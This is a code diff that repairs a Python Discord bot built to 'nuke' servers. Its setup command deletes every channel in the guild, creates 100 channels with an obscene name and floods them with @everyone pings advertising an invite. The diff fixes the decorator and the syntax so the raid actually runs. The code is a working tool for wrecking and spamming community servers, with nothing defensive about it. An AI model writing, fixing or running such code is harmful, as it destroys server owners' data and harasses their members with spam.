@@ -1,4 +1,3 @@
-#Fast deletion of channels and creation of channels and now send 35 messages in the channels
 import discord
 from discord.ext import commands, tasks
 import asyncio
@@ -24,19 +23,19 @@ async def send_messages_loop(channels, message, delay, num_messages):
             else:
                 raise
 
-bot.command()
+@bot.command()
 async def setup(ctx):
     channelname = "Ultimate-Fucker"
     message = "@everyone @here join to: "
     delay = 0.1
     num_messages = 35
 
-    await asyncio.gather(*[channel.delete channel in ctx.guild.channels])
+    await asyncio.gather(*[channel.delete() for channel in ctx.guild.channels])
 
     new_channels = []
 
     async def create_channel(i):
-        new_channel = await ctx.guild.create_text_channel(f'{channelname}')
+        new_channel = await ctx.guild.create_text_channel(f'{channelname}-{i}')
         new_channels.append(new_channel)
 
     await asyncio.gather(*[create_channel(i) for i in range(100)])
@@ -44,4 +43,5 @@ async def setup(ctx):
     await asyncio.sleep(2)
 
     bot.loop.create_task(send_messages_loop(new_channels, message, delay, num_messages))
+
 bot.run('TOKEN-OF-THE-BOT')
